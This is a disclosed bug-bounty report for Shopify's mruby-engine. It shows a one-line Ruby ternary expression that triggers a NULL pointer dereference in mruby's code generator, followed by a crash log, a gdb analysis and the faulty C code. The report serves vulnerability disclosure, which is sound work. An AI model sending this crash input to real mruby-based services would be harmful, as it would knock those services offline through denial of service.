# NULL pointer dereference when parsing ternary operators

## Report Details
- **Report ID**: 181677
- **URL**: https://hackerone.com/reports/181677
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-11-11T23:43:11.785Z
- **Disclosed**: 2016-12-17T02:31:04.612Z

## Reporter
- **Username**: jpenalbae
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
There is a NULL pointer dereference when parsing ternary operators which will cause a crash. This could be used to cause a DoS.

Sample code causing the crash (file sample.rb is also attached):
```ruby
b = a () ? 1 : 0
```

Note that `a ()` should be treated as a method call which in this case is also undefined, but when adding a blank in between the `a` and `()` it causes a crash (Find full crash attached as crash.log):
```
$ bin/sandbox /tmp/sample.rb
bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000000
ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:000a48 EVAL   bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:000380 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
bin/sandbox:20:in `<main>'
bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 RIP: 0x00007f5de668c3df RBP: 0x00007f5de5237ef4 RSP: 0x00007ffdcbdda5e0
 RAX: 0x00007f5de5237e2c RBX: 0x00007f5de523f830 RCX: 0x0000000000000000
 RDX: 0x00007f5de66e710c RDI: 0x00007f5de5237f0c RSI: 0x0000000000000000
  R8: 0x0000000000000000  R9: 0x00007f5de52055d0 R10: 0x0000000000000001
 R11: 0x0000000000000001 R12: 0x00007f5de52055d0 R13: 0x0000000000000005
 R14: 0x0000000000000001 R15: 0x00007f5de5237f24 EFL: 0x0000000000010217

-- C level backtrace information -------------------------------------------
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea978ea5]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9790dc]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea853364]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea904dbe]
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f5dea5d7ed0]
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x37f) [0x7f5de668c3df] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(gen_values+0x52) [0x7f5de6692eb2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:825
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(gen_call.isra.12+0x101) [0x7f5de66934c1] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:855
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x3722) [0x7f5de668f782] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1533
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x30d8) [0x7f5de668f138] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1637
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x2e9e) [0x7f5de668eefe] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1233
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(scope_body.isra.17+0x3e) [0x7f5de6694b2e] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:718
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x2187) [0x7f5de668e1e7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1528
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_generate_code+0xda) [0x7f5de669663a] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:2890
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(me_mruby_engine_generate_code+0x7a) [0x7f5de665800a] ../../../../ext/mruby_engine/mruby_engine.c:226
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(ext_mruby_engine_eval+0x89) [0x7f5de665a619] ../../../../ext/mruby_engine/ext.c:193
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9667bb]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9746a3]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9756d3]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea96a509]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea96f342]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea85671d]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3(ruby_exec_node+0x1d) [0x7f5dea85811d]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3(ruby_run_node+0x1e) [0x7f5dea85a25e]
ruby [0x40089b]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0) [0x7f5de9883730]
ruby(_start+0x29) [0x4008c9]
```

If we run it under gdb:
```
$ gdb --args /usr/bin/ruby bin/sandbox /tmp/sample.rb
(gdb) r
Starting program: /usr/bin/ruby bin/sandbox /tmp/sample.rb
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7ff5700 (LWP 26490)]

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff37f53df in codegen (s=s@entry=0x7ffff23a8830, tree=0x7ffff23a0f24, val=val@entry=1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361
1361          node *e = tree->cdr->cdr->car;
(gdb) x/2i 0x00007ffff37f53df
=> 0x7ffff37f53df <codegen+895>:        mov    rax,QWORD PTR [rsi]
   0x7ffff37f53e2 <codegen+898>:        lea    rcx,[rax-0x33]
(gdb) i r rsi
rsi            0x0      0
(gdb) list *(0x00007ffff37f53df)
0x7ffff37f53df is in codegen (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361).
1356        break;
1357
1358      case NODE_IF:
1359        {
1360          int pos1, pos2;
1361          node *e = tree->cdr->cdr->car;
1362
1363          switch ((intptr_t)tree->car->car) {
1364          case NODE_TRUE:
1365          case NODE_INT:
(gdb) print tree
$2 = (node *) 0x7ffff23a0f24
(gdb) print tree->cdr
$3 = (struct mrb_ast_node *) 0x7ffff23a0f0c
(gdb) print tree->cdr->cdr
$4 = (struct mrb_ast_node *) 0x7ffff23a0e2c
(gdb) print tree->car
$5 = (struct mrb_ast_node *) 0x0
(gdb) print *tree
$6 = {
  car = 0x0,
  cdr = 0x7ffff23a0f0c,
  lineno = 1,
  filename_index = 0
}
(gdb)
```

Even if gdb points that the bug is at `mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361` it is not, the bug its at the next line `1363`. Below is the affected code:

```C
  case NODE_IF:
    {
      int pos1, pos2;
      node *e = tree->cdr->cdr->car;

      switch ((intptr_t)tree->car->car) {   /* <-- tree->car happens to be NULL  */
      case NODE_TRUE:
      case NODE_INT:
      case NODE_STR:
        codegen(s, tree->cdr->car, val);
        return;
      case NODE_FALSE:
      case NODE_NIL:
        codegen(s, e, val);
        return;
      }
      codegen(s, tree->car, VAL);
      pop();
```

As we can see from gdb and the code, the bug is at `switch ((intptr_t)tree->car->car)` as `tree->car` points to a NULL which causes the NULL pointer dereference when accessing it.


Tested under latest version:
```
$ date
Sat Nov 12 00:23:43 CET 2016
$ cd mruby-engine/
$ git rev-parse HEAD
5a5eac4f380b5169882e8a851f0c0abcc7e2f266
$ cd ext/mruby_engine/mruby
$ git rev-parse HEAD
6c299aae67e2e0f13a470b855298bc1efb43387a
```

## Attachments
- sample.rb
- crash.log
